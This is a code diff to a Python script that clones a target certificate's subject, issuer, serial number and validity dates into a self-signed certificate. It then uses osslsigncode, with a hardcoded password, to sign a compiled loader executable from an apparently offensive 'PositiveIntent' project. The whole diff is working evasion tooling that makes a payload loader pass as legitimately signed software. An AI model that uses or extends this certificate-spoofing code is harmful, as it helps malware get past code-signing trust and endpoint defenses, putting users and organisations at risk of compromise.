@@ -1,6 +1,7 @@
 import os
 import socket
 import ssl
+import sys
 import subprocess
 from cryptography import x509
 from cryptography.hazmat.primitives.serialization import PrivateFormat, pkcs12
@@ -24,8 +25,12 @@ def generate_self_signed_certificate(cert):
         key_size=2048,
         backend=default_backend()
     )
+    
     subject = cert.subject
-    issuer = cert.subject
+    issuer = cert.issuer
+    serial_number = cert.serial_number
+    not_before = cert.not_valid_before_utc
+    not_after = cert.not_valid_after_utc
 
     self_signed_cert = x509.CertificateBuilder().subject_name(
         subject
@@ -34,11 +39,11 @@ def generate_self_signed_certificate(cert):
     ).public_key(
         private_key.public_key()
     ).serial_number(
-        x509.random_serial_number()
+        serial_number
     ).not_valid_before(
-        datetime.utcnow()
+        not_before
     ).not_valid_after(
-        datetime.utcnow() + timedelta(days=365)
+        not_after
     ).add_extension(
         x509.BasicConstraints(ca=True, path_length=None), critical=True
     ).sign(private_key, hashes.SHA256(), default_backend())  # Correct import for SHA256
@@ -59,15 +64,32 @@ def save_pkcs12(cert, private_key, output_filename, password):
 
 # Step 4: Digitally Sign Executable File
 def sign_executable(p12_path, assembly_name):
-    cmd = [
-        "C:\\Users\\Joe\\Downloads\\osslsigncode-2.9-windows-x64-mingw\\bin\\osslsigncode.exe", "sign",
-        "-pkcs12", p12_path,
-        "-pass", "DepthSecurity",
-        "-in", os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\PositiveIntent\\bin\\release\\net48\\{assembly_name}.exe"),
-        "-n", assembly_name,
-        "-t", "http://timestamp.digicert.com",
-        "-out", os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\{assembly_name}.exe")
-    ]
+
+    unsigned_loader_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\PositiveIntent\\bin\\release\\net48\\{assembly_name}.exe"))
+    signed_loader_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"..\\temp\\{assembly_name}.exe"))
+    osslsigncode_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..\\windows_dependencies\\osslsigncode.exe"))
+
+    if sys.platform == 'win32':
+        cmd = [
+            osslsigncode_path, "sign",
+            "-pkcs12", p12_path,
+            "-pass", "DepthSecurity",
+            "-in", unsigned_loader_path,
+            "-n", assembly_name,
+            "-t", "http://timestamp.digicert.com",
+            "-out", signed_loader_path
+        ]
+    else:
+        cmd = [
+            "osslsigncode", "sign",
+            "-pkcs12", p12_path,
+            "-pass", "DepthSecurity",
+            "-in", unsigned_loader_path,
+            "-n", assembly_name,
+            "-t", "http://timestamp.digicert.com",
+            "-out", signed_loader_path
+        ]
+    
     subprocess.run(cmd, check=True, stdout = subprocess.DEVNULL)
 
 def run(domain, assembly_name):
